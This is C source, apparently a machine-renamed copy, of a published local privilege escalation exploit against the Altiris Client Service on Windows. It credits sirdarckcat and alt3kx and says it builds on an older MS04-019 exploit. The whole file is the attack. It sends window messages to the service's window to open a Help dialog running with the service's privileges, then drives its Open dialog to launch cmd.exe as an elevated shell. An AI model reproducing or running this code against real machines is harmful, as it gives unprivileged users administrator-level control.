
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_3__ TYPE_1__ ;


struct TYPE_3__ {int x; int y; } ;
typedef TYPE_1__ POINT ;
typedef int LPARAM ;
typedef scalar_t__ HWND ;


 scalar_t__ FUNC_0 (char*,char*) ;
 scalar_t__ FUNC_1 (scalar_t__,int *,char*,int *) ;
 scalar_t__ FUNC_2 (scalar_t__,int) ;
 int FUNC_3 () ;
 int FUNC_4 () ;
 int FUNC_5 (int ) ;
 int FUNC_6 (scalar_t__,int,int *,int *) ;
 int FUNC_7 (scalar_t__,int,int,int) ;
 int FUNC_8 (int) ;
 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 scalar_t__ FUNC_9 (TYPE_1__) ;
 size_t FUNC_10 (char*) ;
 int FUNC_11 (char*,...) ;
 int FUNC_12 (char*,char*) ;

int FUNC_13(int VAR_8, char* VAR_9[])
{
 HWND VAR_10, VAR_11;
 POINT VAR_12;
 int VAR_13,VAR_14=0;
 char VAR_15[255][255];
 char VAR_16[255][255];
 char VAR_17[]="Altiris Client Service";

 FUNC_12(VAR_15[0x0c],"Aide de Windows");
 FUNC_12(VAR_15[0x09],"Windows Help");
 FUNC_12(VAR_15[0x0a],"Ayuda de Windows");

 FUNC_12(VAR_16[0x0c],"Ouvrir");
 FUNC_12(VAR_16[0x09],"Open");
 FUNC_12(VAR_16[0x0a],"Abrir");

 FUNC_11("##########################################################\n");
 FUNC_11("#                  Altiris Client Service                #\n");
 FUNC_11("# WM_COMMANDHELP Windows Privilege Escalation Exploit    #\n");
 FUNC_11("# by sirdarckcat & alt3kx                                #\n");
 FUNC_11("#                                                        #\n");
 FUNC_11("# This exploit is based on www.milw0rm.com/exploits/350  #\n");
 FUNC_11("# Utility Manager Privilege Elevation Exploit (MS04-019) #\n");
 FUNC_11("# by Cesar Cerrudo                                       #\n");
 FUNC_11("##########################################################\n\n");

 VAR_13=FUNC_5(FUNC_3());
 if (VAR_13==0 && (VAR_13=FUNC_5(FUNC_4()))){
    FUNC_11("Lang not found, using english\n");
    VAR_13=9;
 }

 char VAR_18[]="%windir%\\system32\\cmd.ex?";

 if (VAR_8<2){
    FUNC_11("Use:\n> %s [LANG-ID]\n\n",VAR_9[0]);
    FUNC_11("Look for your LANG-ID here:\n");
    FUNC_11("http://msdn2.microsoft.com/en-us/library/ms776294.aspx\n");
    FUNC_11("\nAnyway, the program will try to guess it.\n\n");
    return 0;
 }else{
    if (VAR_8==2){
       if (VAR_15[FUNC_10(VAR_9[1])]){
          VAR_13=FUNC_10(VAR_9[1]);
          FUNC_11("Lang changed\n");
       }else{
          FUNC_11("Lang not supported\n",VAR_13);
       }
    }
 }
 FUNC_11("Using Lang %d\n",VAR_13);
 FUNC_11("Looking for %s..\n",VAR_17);
 VAR_10=FUNC_0(((void*)0), VAR_17);
 if (!VAR_10) {
  FUNC_11("Window %s not found\n", VAR_17);
  return 0;
 }else{
  FUNC_11("Found! exploiting..\n");
 }
 FUNC_6(VAR_10,0x313,((void*)0),((void*)0));

 FUNC_8(100);

 FUNC_7(VAR_10,0x365,((void*)0),0x1);
 FUNC_8(300);
 pp:
 if (!FUNC_0(((void*)0), VAR_15[VAR_13])){
    FUNC_11("Help Window not found.. exploit unsuccesful\n");
    if (VAR_13!=9){
       FUNC_11("Trying with english..\n");
       VAR_13=9;
       goto pp;
    }else{
          return 0;
    }
 }else{
    FUNC_11("Help Window found! exploiting..\n");
 }
 FUNC_7 (FUNC_0(((void*)0), VAR_15[VAR_13]), VAR_5, VAR_1, 0);
 FUNC_8(500);
 VAR_10 = FUNC_0("#32770",VAR_16[VAR_13]);
 VAR_11 = FUNC_2(VAR_10, 0x47C);
 FUNC_8(500);
 FUNC_11("Sending path..\n");
 FUNC_7 (VAR_11, VAR_7, 0, (LPARAM)VAR_18);
 FUNC_8(800);
 FUNC_7 (VAR_11, VAR_5, VAR_1, 0);
 VAR_11 = FUNC_2(VAR_10, 0x4A0);
 FUNC_11("Looking for cmd..\n");
 FUNC_7 (VAR_11, VAR_5, VAR_2, 0);
 FUNC_8(500);
 VAR_11 = FUNC_1(VAR_10,((void*)0),"SHELLDLL_DefView", ((void*)0));
 VAR_11 = FUNC_2(VAR_11, 0x1);
 FUNC_11("Sending keys..\n");
 FUNC_7 (VAR_11, VAR_5, 0x43, 0);
 FUNC_7 (VAR_11, VAR_5, 0x4D, 0);
 FUNC_7 (VAR_11, VAR_5, 0x44, 0);
 FUNC_8(500);
 mark:
 FUNC_6 (VAR_11, VAR_4, 0, 0);
 FUNC_8(1000);
 VAR_12.x =10; VAR_12.y =30;
 VAR_11=FUNC_9(VAR_12);
  FUNC_8(1000);
 FUNC_11("Opening shell..\n");
 FUNC_7 (VAR_11, VAR_6, VAR_0, 0);
  FUNC_8(1000);
 FUNC_7 (VAR_11, VAR_6, VAR_0, 0);
  FUNC_8(1000);
 FUNC_7 (VAR_11, VAR_6, VAR_1, 0);
  FUNC_8(1000);
 if (!FUNC_0(((void*)0),"C:\\WINDOWS\\system32\\cmd.exe") && !FUNC_0(((void*)0),"C:\\WINNT\\system32\\cmd.exe")){
    FUNC_11("Failed\n");
    if (!VAR_14){
        VAR_14++;
        goto mark;
    }
 }else{
       FUNC_11("Done!\n");
 }
 if(!VAR_14){
    FUNC_7 (VAR_10, VAR_3,0,0);
    FUNC_8(500);
    FUNC_7 (FUNC_0(((void*)0), VAR_15[VAR_13]), VAR_3, 0, 0);
    FUNC_7 (FUNC_0(((void*)0), VAR_9[1]), VAR_3, 0, 0);
 }else{
    FUNC_11("The exploit failed, but maybe the context window of the shell is visibile.\n");
 }
 return 0;
}
